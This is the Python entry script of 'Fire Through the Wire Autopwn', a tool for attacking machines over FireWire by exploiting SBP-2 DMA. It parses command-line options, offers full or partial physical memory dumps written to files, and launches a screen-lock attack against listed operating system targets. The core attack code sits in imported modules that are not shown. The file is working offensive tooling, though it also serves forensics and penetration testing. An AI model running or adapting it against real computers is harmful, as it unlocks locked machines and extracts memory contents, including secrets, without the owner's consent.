#!/usr/bin/env python3
'''
Created on Oct 15, 2011

@author: Carsten Maartmann-Moe <carsten@carmaa.com> aka ntropy <n@tropy.org>
'''
import sys
import getopt
import ftwautopwn.settings as settings
from ftwautopwn.util import msg, fail, separator
from ftwautopwn import screenlock, firewire, memdump
import os
import traceback
from forensic1394.bus import Bus
from ftwautopwn.firewire import FireWire


def main(argv):
    settings.encoding = sys.getdefaultencoding()
    
    # Load available JSON targets - not in use per today
    #===========================================================================
    # configuration = open(settings.configfile, 'r')
    # targets = json.load(configuration)
    # configuration.close()
    #===========================================================================
    
    # Print banner
    print('''
Fire Through the Wire Autopwn (FTWA) v.0.0.3
by Carsten Maartmann-Moe <carsten@carmaa.com> aka ntropy <n@tropy.org> 2012

For updates, check/clone https://github.com/carmaa/FTWAutopwn
''')
    
    # Initialize
    #firewire.init_OUI(settings.OUICONF)
    targets = settings.targets
    
    # Parse args
    try:
        opts, args = getopt.getopt(argv, 
                                   'bdD:f:hilvt:w:n', 
                                   ['businfo', 'dump=', 'file=', 'help',
                                    'interactive', 'list'  'verbose', 
                                    'technique=', 'wait=', 'no-write'])
    except getopt.GetoptError as err:
        msg('!', err)
        usage(argv[0])
        sys.exit(2)
    for opt, arg in opts:
        if opt in ('-h', '--help'):
            usage(argv[0])
            sys.exit()
        elif opt in ('-f', '--file'):
            settings.filemode = True
            settings.filename = str(arg)
        elif opt in ('-l', '--list'):
            msg('*', 'Available targets (from settings.py):')
            separator()
            for n, target in enumerate(targets, 1):
                msg(n, target['OS'] + ': ' + target['name'])
            separator()
            sys.exit()
        elif opt in ('-v', '--verbose'):
            settings.verbose = True
        elif opt in ('-target', '--technique'):
            # TODO
            # settings.target = unlock.select_target(ctx.config, int(arg))
            fail("Option not implemented yet, sorry.")
        elif opt in ('-w', '--wait'):
            settings.fw_delay = int(arg)
        elif opt in ('-n', '--no-write'):
            settings.dry_run = True
        elif opt in ('-d', '--dump-all'):
            settings.memdump = True
        elif opt in ('-D', '--dump'):
            settings.memdump = True
            try:
                start, size = str(arg).split(',')
                # Fix start
                if '0x' in start:
                    start = int(start, 0) & 0xfffff000 # Address
                else:
                    start = int(start) * settings.PAGESIZE # Page number
                settings.dumpstart = start
                # Fix size
                size = size.lower()
                if size.find('kib') != -1 or size.find('kb') != -1:
                    size = int(size.rstrip(' kib')) * settings.KiB
                elif size.find('mib') != -1 or size.find('mb') != -1:
                    size = int(size.rstrip(' mib')) * settings.MiB
                elif size.find('gib') != -1 or size.find('gb') != -1:
                    size = int(size.rstrip(' gib')) * settings.GiB
                else:
                    size = int(size) * settings.PAGESIZE
                settings.dumpsize = size
            except:
                fail('Could not parse argument to {0}'.format(opt))
        elif opt in ('-i', '--interactive'):
            settings.interactive = True
            # TODO
            fail("Option not implemented yet, sorry.")
        elif opt in ('-b', '--businfo'):
            fw = FireWire()
            fw.businfo()
            sys.exit()
        else:
            assert False, 'Option not handled: ' + opt
    
    if not settings.filemode and not os.geteuid() == 0:
        fail("You must be root to run FTWA with FireWire input.")

    # TODO: Detect devices
    try:
        if settings.memdump:
            memdump.dump()
        else:
            screenlock.attack(targets)
    except Exception as exc:
        msg('!', 'Um, something went wrong: {0}'.format(exc))
        separator()
        traceback.print_exc()
        separator()
    except KeyboardInterrupt:
        fail('Aborted')
        
def usage(execname):
    print('''Usage: ''' + execname + ''' [OPTIONS]

Attack machines over the IEEE1394 interface by exploiting SBP-2 DMA.

    -D, --dump=ADDR,PAGES Non-intrusive memory dump. Dumps PAGES of memory
                          content from ADDR page. Memory content is dumped to 
                          files with the file name syntax:
                          'ftwamemdump_START-END.bin'. ADDR can be a page
                          number or a hexadecimal address within a page. PAGES
                          can be a number of pages or a size of data using the
                          denomination KiB, MiB or GiB. Example: -d 0x00ff 5MiB
                          This command dumps the first 5 MiB of memory
    -d                    Same as above, but dumps all available memory
    -f, --file=FILE:      Use a file instead of FireWire bus data as input; for
                          example to facilitate attacks on VMware machines or
                          to ease testing and signature generation efforts
    -h, --help:           Displays this message
    -i, --interactive     Interactive mode. Use this to search for specific
                          signatures at specific offsets
    -l, --list:           Lists available operating system targets
    -n, --no-write:       Dry run, do not write back to memory
    -t TARGET, --technique=TARGET:
                          Specify target operating system (use --list to list 
                          available targets)
    -v, --verbose:        Verbose mode
    -wait, --wait=TIME:   Delay attack by TIME seconds. This is useful in order
                          to guarantee that the target machine has successfully
                          granted the host DMA before attacking. If the
                          attack fails, try to increase this value. Default
                          delay is 15 seconds.''')
    

if __name__ == '__main__':
    main(sys.argv[1:])